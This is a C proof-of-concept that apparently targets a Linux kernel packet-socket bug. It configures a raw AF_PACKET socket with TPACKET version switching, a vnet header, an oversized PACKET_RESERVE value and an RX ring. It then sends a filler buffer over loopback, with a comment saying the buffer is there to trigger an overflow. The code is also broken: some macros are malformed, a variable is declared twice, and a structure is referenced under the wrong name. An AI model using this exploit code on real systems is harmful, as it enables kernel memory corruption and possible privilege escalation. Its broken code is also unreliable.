#define _GNU_SOURCE
#define ERROR 1
#define BLOCK_SIZE  0x800000
#define FRAME_SIZE = 0x10000
#define BLOCK_NUM = 1
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>
#include <stdarg.h>
#include <net/if.h>
#include <stdint.h>



void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}



int main(int argc, char **argv)
{
	int skip_unshare = 0;
	struct stat stbuf;
	int socket_ret;
	int setopt_ret;
	int optval;

	//initialize socket
	int socket_ret = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) );
	if (socket_ret < 0)
	{
		perror("socket initialize failed");
		return 1;
	}
	//setup different option for socket
	optval = TPACKET_V2;
	setopt_ret = setsockopt(socket_ret, SOL_PACKET, PACKET_VERSION, &optval, sizeof(optval));
	if (setopt_ret < 0)
	{
		perror("setsockopt(PACKET_VERSION)\n");
		return 1;
	}
	optval = TPACKET_V1;
	setopt_ret = setsockopt(socket_ret, SOL_PACKET, PACKET_VERSION, &optval, sizeof(optval));
	if (setopt_ret < 0)
	{
		perror("PACKET_VERSION1\n");
		return 1;
	}

	optval = 1;
	setopt_ret = setsockopt(socket_ret, SOL_PACKET, PACKET_VNET_HDR, &optval, sizeof(optval));
	if (setopt_ret < 0)
	{
		perror("PACKET_VNET_HDR\n");
		return 1;
	}

	optval = 0xffb3;
	setopt_ret = setsockopt(socket_ret, SOL_PACKET, PACKET_RESERVE, &optval, sizeof(optval));
	if (setopt_ret < 0)
	{
		perror("define packet size error\n");
		return ERROR;
	}
	//define ring buffer
	struct tpacket_req req_buffer;
	memset(&req, 0, sizeof(req_buffer));
	req_buffer.tp_block_size = BLOCK_SIZE;
	req_buffer.tp_frame_size = FRAME_SIZE;
	req_buffer.tp_block_nr = BLOCK_NUM;
	req_buffer.tp_frame_nr = (req_buffer.tp_block_size * req_buffer.tp_block_nr) / req_buffer.tp_frame_size;

	setopt_ret = setsockopt(socket_ret, SOL_PACKET, PACKET_RX_RING, &req_buffer, sizeof(req_buffer));
	if (setopt_ret < 0) {
		perror("PACKET_RX_RING error");
		exit(EXIT_FAILURE);
	}

	//initialize socket address
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;
	//bind socket
	setopt_ret = bind(socket_ret, (struct sockaddr *)&sa, sizeof(sa));
	if (setopt_ret < 0) {
		perror("bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	uint32_t size = 0x80000/8;
	char* buf = malloc(size);
	if(!buf)
	{
		perror("malloc\n");
		exit(EXIT_FAILURE);
	}
	//define the buffer send to the socket to trigger overflow. 
	memset(buf,0xce,size);
	loopback_send(buf,size);

	return 0;
}


